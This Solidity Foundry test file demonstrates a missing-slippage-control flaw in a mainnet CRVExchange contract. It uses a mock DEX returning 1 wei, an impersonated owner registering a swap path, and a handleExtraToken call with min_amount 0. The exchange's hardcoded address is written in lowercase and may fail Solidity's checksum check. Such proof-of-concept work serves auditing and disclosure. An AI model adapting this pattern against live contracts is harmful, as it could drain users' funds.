pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Minimal ERC20 interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// CFControllerInterfaceForEx as used by CRVExchange
interface CFControllerInterfaceForEx {
    function refundTarget(uint256 _amount) external;
}

// DEX interface expected by CRVExchange
interface SushiUniInterfaceERC20 {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// CRVExchange contract (only needed interfaces for calls)
interface CRVExchangeInterface {
    function owner() external view returns (address);
    function handleExtraToken(address from, address target_token, uint256 amount, uint256 min_amount) external;
    function addPath(address dex, address[] memory path) external;
    function path_indexes(uint256) external view returns (bytes32);
    function path_from_addr(uint256) external view returns (address);
    function path_to_addr(uint256) external view returns (address);
    function paths(bytes32) external view returns (address, address[] memory);
}

contract MockDEX {
    address public fromToken;
    address public toToken;
    uint256 public fakeOutAmount;

    constructor(address _from, address _to, uint256 _fakeOut) {
        fromToken = _from;
        toToken = _to;
        fakeOutAmount = _fakeOut;
    }

    // Returns a fixed amount for simulation
    function getAmountsOut(uint256, address[] memory) external view returns (uint256[] memory ret) {
        ret = new uint256[](2);
        ret[0] = 1 ether; // dummy
        ret[1] = fakeOutAmount;
    }

    // Simulate a swap: transfer fromToken from caller, then send toToken to caller
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256,
        address[] calldata,
        address to,
        uint256
    ) external {
        IERC20(fromToken).transferFrom(msg.sender, address(this), amountIn);
        // Transfer synthetic toToken to recipient
        IERC20(toToken).transfer(to, fakeOutAmount);
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount);
        require(allowance[from][msg.sender] >= amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

contract UserContract is CFControllerInterfaceForEx {
    // This will be called by CRVExchange after swap
    function refundTarget(uint256 _amount) external {
        // Assume the caller (CRVExchange) has approved this contract to spend target_token.
        // Transfer target tokens from CRVExchange to this contract.
        // We hardcode the target token address (set before call)
        address targetToken = targetTokenStorage;
        IERC20(targetToken).transferFrom(msg.sender, address(this), _amount);
    }

    address public targetTokenStorage;

    function setTargetToken(address _token) external {
        targetTokenStorage = _token;
    }
}

contract ExploitTest is Test {
    address constant CRV_EXCHANGE = 0x65ff67d6a61ae6bab8821c584f5f394d35e9b50e;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CRV_TOKEN = 0xD533a949740bb3306d119CC777fa900bA034cd52;

    CRVExchangeInterface crvExchange = CRVExchangeInterface(CRV_EXCHANGE);

    UserContract user;
    MockDEX mockDex;
    MockERC20 fromToken;
    MockERC20 toToken;

    function setUp() public {
        // Label addresses
        vm.label(CRV_EXCHANGE, "CRVExchange");
        vm.label(CRV_TOKEN, "CRV");
        vm.label(WETH, "WETH");

        // Deploy mock tokens
        fromToken = new MockERC20("FromToken", "FROM");
        toToken = new MockERC20("ToToken", "TO");

        // Deploy mock DEX that will return low output
        uint256 fakeLowOutput = 1; // 1 wei
        mockDex = new MockDEX(address(fromToken), address(toToken), fakeLowOutput);

        // Deploy user contract that will receive swapped tokens
        user = new UserContract();
        user.setTargetToken(address(toToken));

        // Fund user with fromToken
        fromToken.mint(address(user), 1000 ether);

        // Fund mock DEX with toToken (to be sent as output)
        toToken.mint(address(mockDex), 1000 ether);

        // Become owner to add a path (use prank)
        address owner = crvExchange.owner();
        vm.startPrank(owner);
        address[] memory path = new address[](2);
        path[0] = address(fromToken);
        path[1] = address(toToken);
        crvExchange.addPath(address(mockDex), path);
        vm.stopPrank();

        vm.label(address(user), "User");
        vm.label(address(mockDex), "MockDEX");
        vm.label(address(fromToken), "FROM");
        vm.label(address(toToken), "TO");
    }

    function test_NoSlippageControl() public {
        // User approves CRVExchange to spend fromToken
        vm.prank(address(user));
        fromToken.approve(CRV_EXCHANGE, 100 ether);

        // User calls handleExtraToken with min_amount = 0 (no slippage protection)
        uint256 amountIn = 100 ether;
        vm.prank(address(user));
        crvExchange.handleExtraToken(
            address(fromToken),
            address(toToken),
            amountIn,
            0 // min_amount = 0
        );

        // After swap, user should have received only the fake low output (1 wei)
        uint256 userBalance = toToken.balanceOf(address(user));
        assertEq(userBalance, 1, "User should have received only 1 wei of target token due to lack of slippage control");

        // Additionally, the user's fromToken balance should have decreased by amountIn
        uint256 fromBalanceUser = fromToken.balanceOf(address(user));
        assertEq(fromBalanceUser, 1000 ether - amountIn, "User's fromToken balance correctly reduced");
    }
}
